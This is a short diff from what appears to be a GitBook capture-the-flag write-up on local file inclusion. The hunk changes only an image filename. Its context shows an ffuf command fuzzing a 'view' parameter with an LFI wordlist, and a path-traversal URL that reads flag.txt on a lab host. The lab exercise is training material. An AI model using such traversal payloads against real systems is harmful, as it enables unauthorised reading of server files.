@@ -70,4 +70,4 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http:
 
 <figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="http://94.237.53.113:55545/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt">http://94.237.53.113:55545/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt</a></p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="http://94.237.53.113:55545/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt">http://94.237.53.113:55545/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt</a></p></figcaption></figure>
